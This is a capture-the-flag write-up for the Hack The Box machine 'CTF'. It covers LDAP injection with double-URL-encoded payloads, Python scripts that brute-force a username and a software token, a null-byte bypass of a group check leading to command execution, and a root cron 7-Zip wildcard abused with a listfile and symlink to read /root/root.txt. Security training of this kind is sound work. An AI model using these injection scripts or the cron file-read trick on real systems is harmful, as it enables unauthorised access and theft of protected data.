+++
title = "HTB - CTF"
date = "2025-04-30T00:00:00+00:00"
tags = ["ctf", "htb", "ldap", "ldap injection", "otp", "otp generation", "cron", "7z", "7zip"]
description = "Writeup for the 'Insane' rated machine: CTF"
+++


 > CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.

## Port Scan Results
___
From the results of the nmap scan, we see that we have 2 ports open: 22 and 80

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: CTF
```

## Website
___
Navigating to `http://10.10.10.122`, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:

{{<figure src="/img/htb/ctf/homepage.png" position=center caption="Home Page">}}

We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at `/status.php`:

{{<figure src="/img/htb/ctf/status.php.png" position=center caption="List of banned IPs">}}

We have a login page at `/login.php`:

{{<figure src="/img/htb/ctf/loginpage.png" position=center caption="Login page">}}

If we try basic credentials such as `admin:1234`, we get the following response:

{{<figure src="/img/htb/ctf/admin_not_found.png" position=center caption="Response for admin:1234">}}

Looking at the source page, we see the following comment under the OTP input field:

{{<figure src="/img/htb/ctf/source_page_comment.png" position=center caption="Comment in the login page source">}}

Knowing that the token string is stored in an "attribute", we can make the assumption that the authentication system is based on LDAP.

### Testing for LDAP Injection
___
Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.

First, we can try to send characters that are specific to LDAP's syntax. For example, the `*` (wilcard) character:

{{<figure src="/img/htb/ctf/wc_char_noenc.png" position=center caption="Sending the * character with no encoding">}}

Sending the `*` character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic. 

If that's the case we can try URL-encoding them:

{{<figure src="/img/htb/ctf/wc_char_enc1.png" position=center caption="* character URL-encoded once">}}

{{<figure src="/img/htb/ctf/wc_char_enc2.png" position=center caption="* character double URL-encoded">}}

When we double URL-encoded our payload, we got a different response: "Cannot login". 

Earlier, when we tried admin we got the response: "User admin not found"

This means we got a valid user by using the `*` character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.

### Username enumeration
___
This is how we'll retrieve the username:
- First we send `a*` as the username. If we get the message "Cannot login", then we know that the first letter is 'a'. If we don't, we move on to the letter 'b' by sending `b*`, so on and so forth.
- Let's say that we confirmed that the first letter is 'a'. Now we repeat the process for the second letter by sending `aa*`
- We repeat this process until we get the full username.

For this, we can use this python script:

```python
import requests
import string
import time

letters = list(string.ascii_lowercase)
url = 'http://10.10.10.122/login.php'

def guess_next_char(current_guessed_string):
    for letter in letters:
        time.sleep(0.3)
        data = {
            "inputUsername": f"{current_guessed_string}{letter}%2a",
            "inputOTP": "1234",
        }
        response = requests.post(url, data=data)
        if "Cannot login" in response.text:
            return letter

    print("END")
    exit(1)

username = ""
while True:
    username += guess_next_char(username)
    print(username)
```

{{<figure src="/img/htb/ctf/ldapuser_guess.png" position=center caption="Script running">}}

The script returned the username `ldapuser`. We can confirm it by trying it on the login page:

{{<figure src="/img/htb/ctf/confirm_ldapuser.png" position=center caption="Confirmation">}}

Now that we have a valid username, we need to know the OTP. 

Referring to the comment we found earlier, the token is stored in one of the attribute. However we don't know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.

### Attribute enumeration
We can use [this LDAP attributes wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) from PayloadsAllTheThings:

```text
c
cn
co
commonName
dc
facsimileTelephoneNumber
givenName
gn
homePhone
id
jpegPhoto
l
mail
mobile
name
o
objectClass
ou
owner
pager
password
sn
st
surname
uid
username
userPassword
```

Assuming that the LDAP logic in the backend looks like the following:

```ldap
(&
  (username=<USERINPUT>)
  (otp=<USERINPUT>)
)
```

We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.

This can be done by sending something like `ldapuser)(attribute=*` as the username (double URL-encoded). 

This will then result in the following "hypothetical" query:


```ldap
(&
  (username=ldapuser)
  (attribute=*)
  (otp=<USERINPUT>)
)
```

If the attribute doesn't exist we won't get the "Cannot login" error message.

Using burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get "Cannot login" in the response 

{{<figure src="/img/htb/ctf/attribute_fuzzing_intruder.png" position=center caption="Setting up Burp Intruder">}}

{{<figure src="/img/htb/ctf/valid_attributes.png" position=center caption="Valid LDAP attributes">}}

Among this list of valid attributes, `pager` seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.

### Token leak
___
We can use a slightly modified version of the previous script:

```python
import requests
import string
import time

letters = list(string.ascii_lowercase)
digits = [int(d) for d in "1234567890"]
url = 'http://10.10.10.122/login.php'

def guess_next_char(current_guessed_string):
    for digit in digits:
        time.sleep(0.3)
        data = {
            "inputUsername": f"ldapuser%29%28pager%3d{current_guessed_string}{digit}%2a",
            "inputOTP": "1234",
        }
        response = requests.post(url, data=data)
        if "Cannot login" in response.text:
            return str(digit)

    print("END")
    exit(1)

token = ""
while True:
    token += guess_next_char(token)
    print(token)
```

{{<figure src="/img/htb/ctf/token_brute_start.png" position=center caption="Start of the attack">}}

{{<figure src="/img/htb/ctf/token_brute_end.png" position=center caption="Brute Force finished">}}

### OTP Generation
___
From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use  the command line tool: `stoken` (It was mentionned on the home page that the authentication was based on [Software Tokens](https://manpages.ubuntu.com/manpages/focal/man1/stoken.1.html))

> Before running the tool, we need to make sure that our clock is synchronized with the server's or use a time offset

```
stoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000
```

After submitting the login request with the generated OTP, we are redirected to the following page `/page.php`:

{{<figure src="/img/htb/ctf/page.php.png" position=center caption="/page.php">}}

### Command execution
___
If we try to run a command, we receive this error message:

{{<figure src="/img/htb/ctf/cmd_error_message.png" position=center caption="Cannot run commands">}}

This is means that there is a group membership check that is done. So in order to execute commands we'll either have to get access to a more privileged account or somehow bypass the group membership check.

We can try to do the latter by injecting a NULL byte (`0x00`) character after closing the ldap query.

For that we'll first send `ldapuser)%00` as the username and increase the number of parenthesis until we close the query.

{{<figure src="/img/htb/ctf/null_byte_1.png" position=center caption="With 1 parenthesis">}}

{{<figure src="/img/htb/ctf/null_byte_2.png" position=center caption="With 2 parenthesis">}}

{{<figure src="/img/htb/ctf/null_byte_3.png" position=center caption="With 3 parenthesis">}}

So we need 3 parenthesis to close the query. Now, we can try to login with `ldapuser)))%00` and a valid OTP and see if we bypass the group membership check.

{{<figure src="/img/htb/ctf/null_byte_login.png" position=center caption="Login with null byte injection">}}

We logged in successfully with the null byte injection.

{{<figure src="/img/htb/ctf/run_cmd_id.png" position=center caption="Running the 'id' command">}}

Now we are able to run commands, we can therefore get a reverse shell:

{{<figure src="/img/htb/ctf/revshell_cmd.png" position=center caption="Executing the reverse shell">}}

{{<figure src="/img/htb/ctf/revshell_caught.png" position=center caption="Catching the reverse shell">}}

## Privesc
___
### apache -> ldapuser
___
Looking at the files of the website, we find credentials for `ldapuser` in `/var/www/html/login.php`:

![](/img/htb/ctf/ldapuser_creds.png)

We can use them to login as `ldapuser` via ssh and retrieve the user flag:

![](/img/htb/ctf/user.txt.png)

### ldapuser -> root
___
Under `/backup`, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute. 

This indicates that there might be a cron job running every minute.

We also have a `error.log` file running every minute which is empty. And a bash script called `honeypot.sh`:

```bash
# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt

# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
```

Essentially this script will use 7zip to backup the contents of the `/var/www/html/uploads` directory. However the command uses a wildcard. We can use this in order to read files we don't have read access for. 

That is possible because with 7zip we can provide listfiles as arguments like this:

```bash
7z @myfile
```

Then 7zip will get the file with the name `myfile` and read its content. This file should contain a list of all the files we want to archive. It could look like this:

```text
file1.pdf
secret.txt
```

In the case where `myfile` is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let's say we have `myfile` pointing to `/root/root.txt`. 7zip will consider the content of `/root/root.txt` as a file to archive, but since there are no files with that name, it will cause an error which will be logged in `error.log` file, disclosing the content of `/root/root.txt`.

> Note that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the `-snl` argument. This will archive the link itself instead of the content of the file that is being pointing at.
> 
> {{<figure src="/img/htb/ctf/snl_arg.png" position=center caption="-snl argument">}}

Another problem is that the `error.log` file is cleaned up after each execution. But we can use the `tail` command to monitor it for any changes:

```bash
tail -f error.log
```

So in one terminal we'll create (as the user `apache`) two files:
- `@myfile`
- `myfile` which is a link to the file we want to read, in this case `/root/root.txt`

{{<figure src="/img/htb/ctf/symlink.png" position=center caption="Creating necessary files">}}

And in the second terminal (as `ldapuser`), we monitor the changes on `error.log`.

After a few seconds, we get the root flag in the second terminal:

{{<figure src="/img/htb/ctf/root.txt.png" position=center caption="Root flag obtained!">}}